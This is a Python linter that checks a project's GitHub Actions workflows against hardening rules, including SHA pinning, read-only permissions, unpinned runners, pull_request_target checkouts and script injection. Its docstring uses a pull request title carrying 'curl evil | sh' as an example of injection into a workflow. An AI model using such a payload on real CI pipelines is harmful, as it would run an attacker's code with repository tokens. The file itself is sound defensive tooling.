#!/usr/bin/env python3
# This Source Code Form is subject to the terms of the Mozilla Public
# License, v. 2.0. If a copy of the MPL was not distributed with this
# file, You can obtain one at https://mozilla.org/MPL/2.0/.

"""Enforce Crimson's GitHub Actions hardening rules.

The supply-chain model treats workflows as part of the product's attack surface,
so its rules are checked mechanically rather than remembered in review:

  pinned-sha       every third-party `uses:` is pinned to a full 40-character
                   commit SHA, because a tag can be moved to point at other code
  version-comment  the pin carries a same-line `# vX.Y.Z` comment. Dependabot
                   rewrites a same-line comment when it bumps the SHA; a comment
                   on the line above silently goes stale
  allowed-owner    actions come from GitHub or CrimsonMail. Anything else needs
                   an explicit `# crimson: allow-third-party (reason)` marker
  read-only        workflow-level permissions exist and grant nothing beyond
                   read; jobs widen them individually
  no-write-all     `permissions: write-all` never appears
  pinned-runner    no `*-latest` runner images, which re-point silently
  target-checkout  a `pull_request_target` workflow never checks out code. That
                   trigger runs with a write token on pull requests from forks,
                   and checking out the fork's code is how such workflows are
                   compromised
  injection        untrusted event text (titles, bodies, branch names, commit
                   messages) is never interpolated with `${{ }}`. Expressions
                   are substituted into scripts before they run, so a pull
                   request titled `"; curl evil | sh; "` executes. Read those
                   values from `context.payload` in github-script instead.
                   This deliberately also rejects the otherwise-safe pattern
                   of passing them through an `env:` mapping: a line-based
                   check cannot tell `env: TITLE: ${{ ... }}` from
                   `with: script: ${{ ... }}`, and the second one is a real
                   injection. The strict rule costs nothing while github-script
                   is available, so it errs that way

Standard library only, so it runs on any runner without installing anything.
Exits non-zero if any rule is violated.
"""

from __future__ import annotations

import pathlib
import re
import sys

ROOT = pathlib.Path(__file__).resolve().parent.parent
WORKFLOWS = ROOT / ".github" / "workflows"

ALLOWED_OWNERS = {"actions", "github", "CrimsonMail"}
THIRD_PARTY_MARKER = "crimson: allow-third-party"

USES = re.compile(r"^\s*-?\s*uses:\s*([^\s#]+)(.*)$")
RUNS_ON = re.compile(r"^\s*runs-on:\s*(.+?)\s*$")
SHA = re.compile(r"^[0-9a-f]{40}$")
VERSION_COMMENT = re.compile(r"#\s*v\d+(\.\d+){0,2}\b")

# Event fields an outsider controls. Interpolating any of them is an injection.
UNTRUSTED = re.compile(
    r"\$\{\{[^}]*\b("
    r"github\.event\.(issue|pull_request|comment|review|review_comment|discussion|"
    r"discussion_comment|pages)\.(title|body)"
    r"|github\.event\.pull_request\.head\.(ref|label)"
    r"|github\.event\.head_commit\.(message|author\.(name|email))"
    r"|github\.event\.commits\b"
    r"|github\.event\.workflow_run\.(head_branch|head_commit\.message|display_title)"
    r"|github\.head_ref"
    r")"
)


class Report:
    def __init__(self) -> None:
        self.problems: list[str] = []

    def add(self, path: pathlib.Path, line: int, rule: str, message: str) -> None:
        try:
            shown = path.resolve().relative_to(ROOT).as_posix()
        except ValueError:
            shown = path.as_posix()
        self.problems.append(f"{shown}:{line}: [{rule}] {message}")


def top_level_permissions(lines: list[str]) -> tuple[int, list[str]] | None:
    """Return (line number, body lines) of the workflow-level permissions block."""
    for index, line in enumerate(lines):
        if re.match(r"^permissions:\s*(.*)$", line):
            inline = line.split(":", 1)[1].strip()
            if inline:
                return index + 1, [inline]
            body = []
            for follow in lines[index + 1:]:
                if follow.strip() == "" or follow.lstrip().startswith("#"):
                    continue
                if not follow.startswith((" ", "\t")):
                    break
                body.append(follow.strip())
            return index + 1, body
    return None


def check(path: pathlib.Path, report: Report) -> None:
    text = path.read_text(encoding="utf-8")
    lines = text.splitlines()

    if not re.search(r"^name:\s*\S", text, re.MULTILINE):
        report.add(path, 1, "name", "workflow has no top-level name")

    permissions = top_level_permissions(lines)
    if permissions is None:
        report.add(path, 1, "read-only", "no workflow-level `permissions:` block")
    else:
        line_no, body = permissions
        for entry in body:
            if entry in ("{}", "read-all"):
                continue
            key, _, value = entry.partition(":")
            if value.strip() != "read":
                report.add(path, line_no, "read-only",
                           f"workflow-level permission `{entry}` must be read-only; "
                           f"grant write at job level instead")

    is_target = bool(re.search(r"^\s*pull_request_target\s*:", text, re.MULTILINE)
                     or re.search(r"^on:\s*\[?[^\n]*pull_request_target", text, re.MULTILINE))

    for number, line in enumerate(lines, start=1):
        stripped = line.strip()
        if stripped.startswith("#"):
            continue

        if "write-all" in line:
            report.add(path, number, "no-write-all", "`write-all` is never acceptable")

        runs_on = RUNS_ON.match(line)
        if runs_on and "latest" in runs_on.group(1):
            report.add(path, number, "pinned-runner",
                       f"`{runs_on.group(1)}` re-points silently; pin an image version")

        if UNTRUSTED.search(line):
            report.add(path, number, "injection",
                       "untrusted event text interpolated with ${{ }}; "
                       "read it from context.payload instead")

        uses = USES.match(line)
        if not uses:
            continue
        target, trailer = uses.group(1), uses.group(2)

        if target.startswith("./"):
            continue  # local action, versioned with the repository

        if "@" not in target:
            report.add(path, number, "pinned-sha", f"`{target}` has no ref at all")
            continue

        action, ref = target.rsplit("@", 1)
        owner = action.split("/", 1)[0]

        if not SHA.match(ref):
            report.add(path, number, "pinned-sha",
                       f"`{action}@{ref}` is not pinned to a full commit SHA")
        elif not VERSION_COMMENT.search(trailer):
            report.add(path, number, "version-comment",
                       f"`{action}` pin needs a same-line `# vX.Y.Z` comment so "
                       f"Dependabot keeps it accurate")

        if owner not in ALLOWED_OWNERS and THIRD_PARTY_MARKER not in trailer:
            report.add(path, number, "allowed-owner",
                       f"`{action}` is third-party; add `# {THIRD_PARTY_MARKER} "
                       f"(reason)` only after review")

        if is_target and action == "actions/checkout":
            report.add(path, number, "target-checkout",
                       "pull_request_target workflows must never check out code")


def main(argv: list[str]) -> int:
    # Explicit paths are for testing the rules themselves against deliberately
    # broken workflows; with none, every workflow in the repository is checked.
    if argv:
        files = [pathlib.Path(arg) for arg in argv]
    else:
        files = sorted(list(WORKFLOWS.glob("*.yml")) + list(WORKFLOWS.glob("*.yaml")))
    if not files:
        print(f"no workflows found under {WORKFLOWS}")
        return 1

    report = Report()
    for path in files:
        check(path, report)

    for problem in report.problems:
        print(problem)

    if report.problems:
        print(f"\n{len(report.problems)} problem(s) in {len(files)} workflow(s).")
        return 1

    print(f"{len(files)} workflow(s) checked: all pinned, read-only by default, "
          f"no injection paths.")
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
